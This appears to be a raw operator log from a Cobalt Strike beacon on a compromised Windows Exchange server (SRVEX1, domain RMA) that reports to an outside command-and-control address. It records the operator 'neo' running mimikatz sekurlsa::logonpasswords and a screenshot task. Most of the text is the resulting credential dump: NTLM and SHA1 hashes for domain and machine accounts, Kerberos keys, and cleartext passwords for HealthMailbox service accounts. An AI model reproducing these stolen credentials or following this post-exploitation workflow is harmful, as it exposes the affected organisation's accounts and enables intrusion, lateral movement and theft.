11/27 17:33:35 UTC [metadata] 92.38.235.45 <- 192.168.111.4; computer: SRVEX1; user: СИСТЕМА *; process: dns.exe; pid: 96028; os: Windows; version: 6.2; build: 9200; beacon arch: x86 (x64)
11/27 17:35:11 UTC [input] <neo> logonpasswords
11/27 17:35:11 UTC [task] <T1003, T1055, T1093> Tasked beacon to run mimikatz's sekurlsa::logonpasswords command
11/27 17:35:26 UTC [checkin] host called home, sent: 313675 bytes
11/27 17:35:28 UTC [output]
received output:

Authentication Id : 0 ; 3480605446 (00000000:cf75d306)
Session           : NetworkCleartext from 0
User Name         : HealthMailbox91a27e7
Domain            : RMA
Logon Server      : SRVAD1
Logon Time        : 27.11.2023 20:33:24
SID               : S-1-5-21-3459667573-274549218-1700071667-1234
	msv :	
	 [00000003] Primary
	 * Username : HealthMailbox91a27e7
	 * Domain   : RMA
	 * NTLM     : 46d24e1085dc31e303cc6ee302e02e84
	 * SHA1     : 93329c9a081cfb22993ee2e05aeed2faeceb2c05
	tspkg :	
	wdigest :	
	 * Username : HealthMailbox91a27e7
	 * Domain   : RMA
	 * Password : (null)
	kerberos :	
	 * Username : HealthMailbox91a27e7
	 * Domain   : RMA.LOCAL
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 3480604650 (00000000:cf75cfea)
Session           : NetworkCleartext from 0
User Name         : HealthMailbox91a27e7
Domain            : RMA
Logon Server      : SRVAD1
Logon Time        : 27.11.2023 20:33:24
SID               : S-1-5-21-3459667573-274549218-1700071667-1234
	msv :	
	 [00000003] Primary
	 * Username : HealthMailbox91a27e7
	 * Domain   : RMA
	 * NTLM     : 46d24e1085dc31e303cc6ee302e02e84
	 * SHA1     : 93329c9a081cfb22993ee2e05aeed2faeceb2c05
	tspkg :	
	wdigest :	
	 * Username : HealthMailbox91a27e7
	 * Domain   : RMA
	 * Password : (null)
	kerberos :	
	 * Username : HealthMailbox91a27e7
	 * Domain   : RMA.LOCAL
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 3365345326 (00000000:c897182e)
Session           : NetworkCleartext from 0
User Name         : HealthMailboxfd63d46
Domain            : RMA
Logon Server      : SRVAD1
Logon Time        : 26.11.2023 9:59:14
SID               : S-1-5-21-3459667573-274549218-1700071667-1235
	msv :	
	 [00000003] Primary
	 * Username : HealthMailboxfd63d46
	 * Domain   : RMA
	 * NTLM     : 232bdbba5d763598b8086c68b1a36b65
	 * SHA1     : 55fce28bbf24f7ddfa7268fa9df771c786b36e07
	tspkg :	
	wdigest :	
	 * Username : HealthMailboxfd63d46
	 * Domain   : RMA
	 * Password : (null)
	kerberos :	
	 * Username : HealthMailboxfd63d46
	 * Domain   : RMA.LOCAL
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 995 (00000000:000003e3)
Session           : Service from 0
User Name         : IUSR
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 15.10.2023 9:55:56
SID               : S-1-5-17
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 71737 (00000000:00011839)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 15.10.2023 9:55:47
SID               : S-1-5-90-1
	msv :	
	 [00000003] Primary
	 * Username : SRVEX1$
	 * Domain   : RMA
	 * NTLM     : acc043e926175fea4e6bc9069e5ad7f7
	 * SHA1     : 9e3b222fbc180123addeb4ad8b5fa944f79fc401
	tspkg :	
	wdigest :	
	 * Username : SRVEX1$
	 * Domain   : RMA
	 * Password : (null)
	kerberos :	
	 * Username : SRVEX1$
	 * Domain   : rma.local
	 * Password : dd 39 32 2c d5 ca b2 13 f7 f0 74 5f 37 de 56 a3 7b 8a fd 59 41 73 c0 23 9f 9e 3d cc fc 67 ef ec 7b 5b b0 9b bc 5a d9 1d bb 4f 2f 6d dc 8b 32 eb 58 25 fb 9d c7 99 d5 cb 84 02 15 35 cf e0 ea b6 a1 7b cb 18 9d c1 2b 6b 37 cf 82 99 a9 1d 3b ce 9f 80 48 5a 02 51 bf e8 51 32 8f c8 6d d3 0a f7 e2 b7 fa 21 6c 52 74 a4 65 3b 57 d5 cf ee 17 fc 6f 17 38 2f a8 bc a9 3b 26 52 39 9d 2c 51 1a c2 a0 aa be 20 66 45 f7 db 38 fa e6 64 b0 b8 9c 99 8a 4c 91 54 ac c7 51 fc 3d 14 3e bc 1b 55 1c 58 23 90 23 3b 65 4d bb 28 9a 27 4a 3e 3e e5 73 ef 65 d4 d5 b7 e1 1b a3 87 69 14 99 b1 16 f3 63 27 48 80 2f fc ef f9 6e b9 ac 56 bb d4 2b db 3e a9 0a 79 5e 4e 87 9d a9 f9 7c c3 9b 23 76 10 55 e2 07 7c 6a 9f 19 49 d1 20 b7 ab 78 a2 15 71 f3 28 
	ssp :	
	credman :	

Authentication Id : 0 ; 3479600640 (00000000:cf667e00)
Session           : NetworkCleartext from 0
User Name         : HealthMailboxfd63d46
Domain            : RMA
Logon Server      : SRVAD1
Logon Time        : 27.11.2023 20:13:24
SID               : S-1-5-21-3459667573-274549218-1700071667-1235
	msv :	
	 [00000003] Primary
	 * Username : HealthMailboxfd63d46
	 * Domain   : RMA
	 * NTLM     : 232bdbba5d763598b8086c68b1a36b65
	 * SHA1     : 55fce28bbf24f7ddfa7268fa9df771c786b36e07
	tspkg :	
	wdigest :	
	 * Username : HealthMailboxfd63d46
	 * Domain   : RMA
	 * Password : (null)
	kerberos :	
	 * Username : HealthMailboxfd63d46
	 * Domain   : RMA.LOCAL
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 3432492881 (00000000:cc97af51)
Session           : NetworkCleartext from 0
User Name         : aadd2
Domain            : RMA
Logon Server      : SRVAD1
Logon Time        : 27.11.2023 6:09:35
SID               : S-1-5-21-3459667573-274549218-1700071667-1104
	msv :	
	 [00000003] Primary
	 * Username : aadd2
	 * Domain   : RMA
	 * NTLM     : ee9e3e405864b1eb71fcf212f0c119ac
	 * SHA1     : 2d4946412351be7eeec65a34c982c6ed20ba836b
	tspkg :	
	wdigest :	
	 * Username : aadd2
	 * Domain   : RMA
	 * Password : (null)
	kerberos :	
	 * Username : aadd2
	 * Domain   : RMA.LOCAL
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 2712202326 (00000000:a1a8ec56)
Session           : NetworkCleartext from 0
User Name         : HealthMailboxfd63d46
Domain            : RMA
Logon Server      : SRVAD1
Logon Time        : 18.11.2023 19:20:55
SID               : S-1-5-21-3459667573-274549218-1700071667-1235
	msv :	
	 [00000003] Primary
	 * Username : HealthMailboxfd63d46
	 * Domain   : RMA
	 * NTLM     : 232bdbba5d763598b8086c68b1a36b65
	 * SHA1     : 55fce28bbf24f7ddfa7268fa9df771c786b36e07
	tspkg :	
	wdigest :	
	 * Username : HealthMailboxfd63d46
	 * Domain   : RMA
	 * Password : (null)
	kerberos :	
	 * Username : HealthMailboxfd63d46
	 * Domain   : RMA.LOCAL
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 1414699380 (00000000:54529974)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 02.11.2023 15:45:12
SID               : S-1-5-90-2
	msv :	
	 [00000003] Primary
	 * Username : SRVEX1$
	 * Domain   : RMA
	 * NTLM     : 5fac3ed42feacde54bf86af5bdea7d68
	 * SHA1     : 70aab2196ec6ef6a0916a0d0145a17e234ac3ecc
	tspkg :	
	wdigest :	
	 * Username : SRVEX1$
	 * Domain   : RMA
	 * Password : (null)
	kerberos :	
	 * Username : SRVEX1$
	 * Domain   : rma.local
	 * Password : 0e c8 f8 50 d5 a9 ae 22 cc f1 93 20 09 ea a2 6d 39 a7 87 33 7c 95 b0 e5 34 de c2 b3 01 e4 9e 6a b7 05 7e 45 ee dc 45 90 ae 06 d6 29 06 b1 21 2e ea 31 90 80 c3 78 08 de 08 14 39 09 e5 69 11 1e 69 03 c2 0d cf 7e 15 63 a8 33 ef f8 67 64 ad b2 44 be 4d b4 a1 d6 c5 7b b0 ad 45 fe f6 f3 67 d6 e5 dc 00 c0 e4 6b 78 5f b2 f2 e3 76 df d1 0e 0e c4 83 7a 94 16 3b 18 09 7b 7c bd cf f4 f4 5b 99 85 60 b1 7c c8 b0 3c 42 97 32 cd 57 fb bb 3d ea 1b 2e 01 a2 97 9f 6e 5d a4 c4 d6 77 da ec 42 65 f4 aa 24 1c a7 f8 38 92 56 d2 e4 a3 cd 93 6f 28 c9 97 a5 74 17 58 8b 29 52 72 3b a1 a5 02 34 14 07 e7 3e 9e 8c 72 1c 11 25 06 3b 06 56 7f b5 82 a9 2c ef 9d fb a4 74 f3 85 6e de 92 82 3a e5 cb f6 3c 0c 1e db 94 b6 6b bf 55 e1 f6 aa 3e 92 a4 
	ssp :	
	credman :	

Authentication Id : 0 ; 384814337 (00000000:16efcd01)
Session           : Interactive from 1
User Name         : aadd2
Domain            : RMA
Logon Server      : SRVAD1
Logon Time        : 19.10.2023 16:22:01
SID               : S-1-5-21-3459667573-274549218-1700071667-1104
	msv :	
	 [00000003] Primary
	 * Username : aadd2
	 * Domain   : RMA
	 * NTLM     : ee9e3e405864b1eb71fcf212f0c119ac
	 * SHA1     : 2d4946412351be7eeec65a34c982c6ed20ba836b
	 [00010000] CredentialKeys
	 * NTLM     : ee9e3e405864b1eb71fcf212f0c119ac
	 * SHA1     : 2d4946412351be7eeec65a34c982c6ed20ba836b
	tspkg :	
	wdigest :	
	 * Username : aadd2
	 * Domain   : RMA
	 * Password : (null)
	kerberos :	
	 * Username : aadd2
	 * Domain   : RMA.LOCAL
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 384814142 (00000000:16efcc3e)
Session           : Interactive from 1
User Name         : aadd2
Domain            : RMA
Logon Server      : SRVAD1
Logon Time        : 19.10.2023 16:22:01
SID               : S-1-5-21-3459667573-274549218-1700071667-1104
	msv :	
	 [00000003] Primary
	 * Username : aadd2
	 * Domain   : RMA
	 * NTLM     : ee9e3e405864b1eb71fcf212f0c119ac
	 * SHA1     : 2d4946412351be7eeec65a34c982c6ed20ba836b
	 [00010000] CredentialKeys
	 * NTLM     : ee9e3e405864b1eb71fcf212f0c119ac
	 * SHA1     : 2d4946412351be7eeec65a34c982c6ed20ba836b
	tspkg :	
	wdigest :	
	 * Username : aadd2
	 * Domain   : RMA
	 * Password : (null)
	kerberos :	
	 * Username : aadd2
	 * Domain   : RMA.LOCAL
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 49578 (00000000:0000c1aa)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 15.10.2023 9:55:47
SID               : 
	msv :	
	 [00000003] Primary
	 * Username : SRVEX1$
	 * Domain   : RMA
	 * NTLM     : 5fac3ed42feacde54bf86af5bdea7d68
	 * SHA1     : 70aab2196ec6ef6a0916a0d0145a17e234ac3ecc
	tspkg :	
	wdigest :	
	kerberos :	
	ssp :	
	 [00000000]
	 * Username : HealthMailboxfd63d465bd92471188548345b8395e05@rma.ru
	 * Domain   : (null)
	 * Password : #^8Syt:v5!bh7xM^x1ZkgY9D-{Ai@s@/hC3#.Vlo;rJrJ0sgFzYWFMChyKG)[S$^w3a^Is{V8NggEtfNy1e//]B_]v6E^8Hs8}[)(Qmd*m7Q@-}$@*1w48+$V3JnFMya
	 [00000001]
	 * Username : HealthMailboxfd63d465bd92471188548345b8395e05@rma.ru
	 * Domain   : (null)
	 * Password : #^8Syt:v5!bh7xM^x1ZkgY9D-{Ai@s@/hC3#.Vlo;rJrJ0sgFzYWFMChyKG)[S$^w3a^Is{V8NggEtfNy1e//]B_]v6E^8Hs8}[)(Qmd*m7Q@-}$@*1w48+$V3JnFMya
	 [00000002]
	 * Username : HealthMailbox91a27e7ac1a54905a753df1624693463@rma.ru
	 * Domain   : (null)
	 * Password : twdH!Y:DPRmlV;/uIIhm4EO!(|ocZKV{U5Zr3Ah:.n8#Kdt-]_QT+]n]vmi/E^U2nmRf!rzfiVc!w:dgA/9h!s5b2ZSygJ(WRUb$Pd;q$5JB@(%KPJ117V-IPB0Pl2J-
	 [00000003]
	 * Username : SRVEX1$
	 * Domain   : (null)
	 * Password : (null)
	credman :	

Authentication Id : 0 ; 3480577801 (00000000:cf756709)
Session           : NetworkCleartext from 0
User Name         : HealthMailbox070ccc8
Domain            : RMA
Logon Server      : SRVAD1
Logon Time        : 27.11.2023 20:32:55
SID               : S-1-5-21-3459667573-274549218-1700071667-1232
	msv :	
	 [00000003] Primary
	 * Username : HealthMailbox070ccc8
	 * Domain   : RMA
	 * NTLM     : 7fdd93f05ed3f673bcb358446f0016e9
	 * SHA1     : 1371d9556f703cd1cb502a15afee1ecddf0857a7
	tspkg :	
	wdigest :	
	 * Username : HealthMailbox070ccc8
	 * Domain   : RMA
	 * Password : (null)
	kerberos :	
	 * Username : HealthMailbox070ccc8
	 * Domain   : RMA.LOCAL
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 2712086015 (00000000:a1a725ff)
Session           : NetworkCleartext from 0
User Name         : HealthMailbox91a27e7
Domain            : RMA
Logon Server      : SRVAD1
Logon Time        : 18.11.2023 19:18:35
SID               : S-1-5-21-3459667573-274549218-1700071667-1234
	msv :	
	 [00000003] Primary
	 * Username : HealthMailbox91a27e7
	 * Domain   : RMA
	 * NTLM     : 46d24e1085dc31e303cc6ee302e02e84
	 * SHA1     : 93329c9a081cfb22993ee2e05aeed2faeceb2c05
	tspkg :	
	wdigest :	
	 * Username : HealthMailbox91a27e7
	 * Domain   : RMA
	 * Password : (null)
	kerberos :	
	 * Username : HealthMailbox91a27e7
	 * Domain   : RMA.LOCAL
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 1414739145 (00000000:545334c9)
Session           : RemoteInteractive from 2
User Name         : ssee2
Domain            : RMA
Logon Server      : SRVAD1
Logon Time        : 02.11.2023 15:45:13
SID               : S-1-5-21-3459667573-274549218-1700071667-1139
	msv :	
	 [00000003] Primary
	 * Username : ssee2
	 * Domain   : RMA
	 * NTLM     : 04c566018e4a7c6cf686b1c246b88758
	 * SHA1     : 27da48431b1ebfce649d6dfed157b8735da45584
	 [00010000] CredentialKeys
	 * NTLM     : 04c566018e4a7c6cf686b1c246b88758
	 * SHA1     : 27da48431b1ebfce649d6dfed157b8735da45584
	tspkg :	
	wdigest :	
	 * Username : ssee2
	 * Domain   : RMA
	 * Password : (null)
	kerberos :	
	 * Username : ssee2
	 * Domain   : RMA.LOCAL
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 15.10.2023 9:55:47
SID               : S-1-5-19
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 71696 (00000000:00011810)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 15.10.2023 9:55:47
SID               : S-1-5-90-1
	msv :	
	 [00000003] Primary
	 * Username : SRVEX1$
	 * Domain   : RMA
	 * NTLM     : 5fac3ed42feacde54bf86af5bdea7d68
	 * SHA1     : 70aab2196ec6ef6a0916a0d0145a17e234ac3ecc
	tspkg :	
	wdigest :	
	 * Username : SRVEX1$
	 * Domain   : RMA
	 * Password : (null)
	kerberos :	
	 * Username : SRVEX1$
	 * Domain   : rma.local
	 * Password : 0e c8 f8 50 d5 a9 ae 22 cc f1 93 20 09 ea a2 6d 39 a7 87 33 7c 95 b0 e5 34 de c2 b3 01 e4 9e 6a b7 05 7e 45 ee dc 45 90 ae 06 d6 29 06 b1 21 2e ea 31 90 80 c3 78 08 de 08 14 39 09 e5 69 11 1e 69 03 c2 0d cf 7e 15 63 a8 33 ef f8 67 64 ad b2 44 be 4d b4 a1 d6 c5 7b b0 ad 45 fe f6 f3 67 d6 e5 dc 00 c0 e4 6b 78 5f b2 f2 e3 76 df d1 0e 0e c4 83 7a 94 16 3b 18 09 7b 7c bd cf f4 f4 5b 99 85 60 b1 7c c8 b0 3c 42 97 32 cd 57 fb bb 3d ea 1b 2e 01 a2 97 9f 6e 5d a4 c4 d6 77 da ec 42 65 f4 aa 24 1c a7 f8 38 92 56 d2 e4 a3 cd 93 6f 28 c9 97 a5 74 17 58 8b 29 52 72 3b a1 a5 02 34 14 07 e7 3e 9e 8c 72 1c 11 25 06 3b 06 56 7f b5 82 a9 2c ef 9d fb a4 74 f3 85 6e de 92 82 3a e5 cb f6 3c 0c 1e db 94 b6 6b bf 55 e1 f6 aa 3e 92 a4 
	ssp :	
	credman :	

Authentication Id : 0 ; 3480405707 (00000000:cf72c6cb)
Session           : NetworkCleartext from 0
User Name         : HealthMailboxfd63d46
Domain            : RMA
Logon Server      : SRVAD1
Logon Time        : 27.11.2023 20:29:24
SID               : S-1-5-21-3459667573-274549218-1700071667-1235
	msv :	
	 [00000003] Primary
	 * Username : HealthMailboxfd63d46
	 * Domain   : RMA
	 * NTLM     : 232bdbba5d763598b8086c68b1a36b65
	 * SHA1     : 55fce28bbf24f7ddfa7268fa9df771c786b36e07
	tspkg :	
	wdigest :	
	 * Username : HealthMailboxfd63d46
	 * Domain   : RMA
	 * Password : (null)
	kerberos :	
	 * Username : HealthMailboxfd63d46
	 * Domain   : RMA.LOCAL
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 3479356493 (00000000:cf62c44d)
Session           : NetworkCleartext from 0
User Name         : HealthMailbox91a27e7
Domain            : RMA
Logon Server      : SRVAD1
Logon Time        : 27.11.2023 20:09:24
SID               : S-1-5-21-3459667573-274549218-1700071667-1234
	msv :	
	 [00000003] Primary
	 * Username : HealthMailbox91a27e7
	 * Domain   : RMA
	 * NTLM     : 46d24e1085dc31e303cc6ee302e02e84
	 * SHA1     : 93329c9a081cfb22993ee2e05aeed2faeceb2c05
	tspkg :	
	wdigest :	
	 * Username : HealthMailbox91a27e7
	 * Domain   : RMA
	 * Password : (null)
	kerberos :	
	 * Username : HealthMailbox91a27e7
	 * Domain   : RMA.LOCAL
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 1414741764 (00000000:54533f04)
Session           : RemoteInteractive from 2
User Name         : ssee2
Domain            : RMA
Logon Server      : SRVAD1
Logon Time        : 02.11.2023 15:45:13
SID               : S-1-5-21-3459667573-274549218-1700071667-1139
	msv :	
	 [00000003] Primary
	 * Username : ssee2
	 * Domain   : RMA
	 * NTLM     : 04c566018e4a7c6cf686b1c246b88758
	 * SHA1     : 27da48431b1ebfce649d6dfed157b8735da45584
	 [00010000] CredentialKeys
	 * NTLM     : 04c566018e4a7c6cf686b1c246b88758
	 * SHA1     : 27da48431b1ebfce649d6dfed157b8735da45584
	tspkg :	
	wdigest :	
	 * Username : ssee2
	 * Domain   : RMA
	 * Password : (null)
	kerberos :	
	 * Username : ssee2
	 * Domain   : RMA.LOCAL
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 1414699403 (00000000:5452998b)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 02.11.2023 15:45:12
SID               : S-1-5-90-2
	msv :	
	 [00000003] Primary
	 * Username : SRVEX1$
	 * Domain   : RMA
	 * NTLM     : acc043e926175fea4e6bc9069e5ad7f7
	 * SHA1     : 9e3b222fbc180123addeb4ad8b5fa944f79fc401
	tspkg :	
	wdigest :	
	 * Username : SRVEX1$
	 * Domain   : RMA
	 * Password : (null)
	kerberos :	
	 * Username : SRVEX1$
	 * Domain   : rma.local
	 * Password : dd 39 32 2c d5 ca b2 13 f7 f0 74 5f 37 de 56 a3 7b 8a fd 59 41 73 c0 23 9f 9e 3d cc fc 67 ef ec 7b 5b b0 9b bc 5a d9 1d bb 4f 2f 6d dc 8b 32 eb 58 25 fb 9d c7 99 d5 cb 84 02 15 35 cf e0 ea b6 a1 7b cb 18 9d c1 2b 6b 37 cf 82 99 a9 1d 3b ce 9f 80 48 5a 02 51 bf e8 51 32 8f c8 6d d3 0a f7 e2 b7 fa 21 6c 52 74 a4 65 3b 57 d5 cf ee 17 fc 6f 17 38 2f a8 bc a9 3b 26 52 39 9d 2c 51 1a c2 a0 aa be 20 66 45 f7 db 38 fa e6 64 b0 b8 9c 99 8a 4c 91 54 ac c7 51 fc 3d 14 3e bc 1b 55 1c 58 23 90 23 3b 65 4d bb 28 9a 27 4a 3e 3e e5 73 ef 65 d4 d5 b7 e1 1b a3 87 69 14 99 b1 16 f3 63 27 48 80 2f fc ef f9 6e b9 ac 56 bb d4 2b db 3e a9 0a 79 5e 4e 87 9d a9 f9 7c c3 9b 23 76 10 55 e2 07 7c 6a 9f 19 49 d1 20 b7 ab 78 a2 15 71 f3 28 
	ssp :	
	credman :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : SRVEX1$
Domain            : RMA
Logon Server      : (null)
Logon Time        : 15.10.2023 9:55:47
SID               : S-1-5-18
	msv :	
	tspkg :	
	wdigest :	
	 * Username : SRVEX1$
	 * Domain   : RMA
	 * Password : (null)
	kerberos :	
	 * Username : srvex1$
	 * Domain   : RMA.LOCAL
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : SRVEX1$
Domain            : RMA
Logon Server      : (null)
Logon Time        : 15.10.2023 9:55:47
SID               : S-1-5-20
	msv :	
	 [00000003] Primary
	 * Username : SRVEX1$
	 * Domain   : RMA
	 * NTLM     : 5fac3ed42feacde54bf86af5bdea7d68
	 * SHA1     : 70aab2196ec6ef6a0916a0d0145a17e234ac3ecc
	tspkg :	
	wdigest :	
	 * Username : SRVEX1$
	 * Domain   : RMA
	 * Password : (null)
	kerberos :	
	 * Username : srvex1$
	 * Domain   : RMA.LOCAL
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 3365211116 (00000000:c8950bec)
Session           : NetworkCleartext from 0
User Name         : HealthMailbox91a27e7
Domain            : RMA
Logon Server      : SRVAD1
Logon Time        : 26.11.2023 9:58:04
SID               : S-1-5-21-3459667573-274549218-1700071667-1234
	msv :	
	 [00000003] Primary
	 * Username : HealthMailbox91a27e7
	 * Domain   : RMA
	 * NTLM     : 46d24e1085dc31e303cc6ee302e02e84
	 * SHA1     : 93329c9a081cfb22993ee2e05aeed2faeceb2c05
	tspkg :	
	wdigest :	
	 * Username : HealthMailbox91a27e7
	 * Domain   : RMA
	 * Password : (null)
	kerberos :	
	 * Username : HealthMailbox91a27e7
	 * Domain   : RMA.LOCAL
	 * Password : (null)
	ssp :	
	credman :	


11/27 17:38:25 UTC [input] <neo> screenshot
11/27 17:38:25 UTC [task] <T1113, T1093> Tasked beacon to take screenshot
11/27 17:38:28 UTC [checkin] host called home, sent: 164434 bytes
11/27 17:38:29 UTC [error] screenshot from desktop 0 is empty
